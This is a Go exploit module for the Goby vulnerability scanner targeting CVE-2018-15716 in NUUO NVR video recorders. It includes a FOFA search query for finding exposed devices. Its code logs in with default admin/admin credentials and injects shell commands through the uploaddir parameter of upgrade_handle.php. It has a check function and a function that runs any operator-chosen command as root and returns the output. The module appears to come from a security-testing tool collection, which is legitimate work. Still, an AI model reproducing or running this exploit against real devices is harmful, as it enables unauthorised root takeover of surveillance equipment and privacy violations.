package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NUUO NVR Upgrade_handle.php RCE (CVE-2018-15716)",
    "Description": "NUUO NVR recorder authorized command execution vulnerability can bypass the CVE-2018-14933 patch. A remote attacker can use this vulnerability to execute operating system commands as root by sending a specially crafted request to the upgrade_handle.php file.",
    "Impact": "NUUO NVR Upgrade_handle.php RCE (CVE-2018-15716)",
    "Recommendation": "<p>Update the firmware to the latest version: <a href=\"https://www.nuuo.com/DownloadMainpage.php\">https://www.nuuo.com/DownloadMainpage.php</a></p>",
    "Product": "NUUO NVR",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "NUUO网络录像机授权命令执行漏洞（CVE-2018-15716）",
            "Description": "NUUO网络录像机授权命令执行漏洞，可绕过CVE-2018-14933补丁。远程攻击者可通过向upgrade_handle.php文件发送特制的请求利用该漏洞以root身份执行操作系统命令。",
            "Impact": "<p>NUUO网络录像机授权命令执行漏洞，可在授权情况下执行系统命令，可绕过 CVE-2018-14933补丁。</p>",
            "Recommendation": "<p>更新固件至最新版本：<a href=\"https://www.nuuo.com/DownloadMainpage.php\" target=\"_blank\">https://www.nuuo.com/DownloadMainpage.php</a></p>",
            "Product": "NUUO-NVRmini",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "NUUO NVR Upgrade_handle.php RCE (CVE-2018-15716)",
            "Description": "NUUO NVR recorder authorized command execution vulnerability can bypass the CVE-2018-14933 patch. A remote attacker can use this vulnerability to execute operating system commands as root by sending a specially crafted request to the upgrade_handle.php file.",
            "Impact": "NUUO NVR Upgrade_handle.php RCE (CVE-2018-15716)",
            "Recommendation": "<p>Update the firmware to the latest version: <a href=\"https://www.nuuo.com/DownloadMainpage.php\">https://www.nuuo.com/DownloadMainpage.php</a><br></p>",
            "Product": "NUUO NVR",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "(title=\"Network Video Recorder Login\" && body=\"NVRmini\")",
    "GobyQuery": "(title=\"Network Video Recorder Login\" && body=\"NVRmini\")",
    "Author": "atdpa4sw0rd@gmail.com",
    "Homepage": "http://www.nuuo.com/",
    "DisclosureDate": "2021-06-15",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2018-15716"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201812-004"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(8)
			cfgSession := httpclient.NewGetRequestConfig("/upgrade_handle.php")
			cfgSession.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgSession.FollowRedirect = false
			cfgSession.VerifyTls = false
			sessionRes, _ := httpclient.DoHttpRequest(u, cfgSession)
			if sessionRes.StatusCode != 200 && !strings.Contains(sessionRes.Header.Get("Set-Cookie"), "PHPSESSID=") {
				return false
			}
			session := sessionRes.Header.Get("Set-Cookie")
			cfgPost := httpclient.NewPostRequestConfig("/login.php")
			cfgPost.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgPost.Header.Store("Cookie", session)
			cfgPost.FollowRedirect = false
			cfgPost.VerifyTls = false
			cfgPost.Data = "language=en&user=admin&pass=admin&submit=Login"
			postRes, _ := httpclient.DoHttpRequest(u, cfgPost)
			if postRes.StatusCode != 302 && !strings.Contains(postRes.Utf8Html, "setting.php") {
				return false
			}
			cfgGet := httpclient.NewGetRequestConfig("/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27||echo+" + randStr + "\"\"" + randStr + "||%27")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.Header.Store("Cookie", session)
			cfgGet.FollowRedirect = false
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfgGet); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randStr+randStr)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cmdEn := url.QueryEscape(fmt.Sprintf("%s", cmd))
			cfgSession := httpclient.NewGetRequestConfig("/upgrade_handle.php")
			cfgSession.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgSession.FollowRedirect = false
			cfgSession.VerifyTls = false
			sessionRes, _ := httpclient.DoHttpRequest(expResult.HostInfo, cfgSession)
			if sessionRes.StatusCode != 200 && !strings.Contains(sessionRes.Header.Get("Set-Cookie"), "PHPSESSID=") {
				return expResult
			}
			session := sessionRes.Header.Get("Set-Cookie")
			cfgPost := httpclient.NewPostRequestConfig("/login.php")
			cfgPost.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgPost.Header.Store("Cookie", session)
			cfgPost.FollowRedirect = false
			cfgPost.VerifyTls = false
			cfgPost.Data = "language=en&user=admin&pass=admin&submit=Login"
			postRes, _ := httpclient.DoHttpRequest(expResult.HostInfo, cfgPost)
			if postRes.StatusCode != 302 && !strings.Contains(postRes.Utf8Html, "setting.php") {
				return expResult
			}
			cfgGet := httpclient.NewGetRequestConfig("/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27||" + cmdEn + "||%27")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.Header.Store("Cookie", session)
			cfgGet.FollowRedirect = false
			cfgGet.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet); err == nil {
				expResult.Success = true
				resinfo := regexp.MustCompile(`(?s)block3(.*?)<br />`).FindStringSubmatch(resp.RawBody)[1]
				expResult.Output = resinfo
			}
			return expResult
		},
	))
}
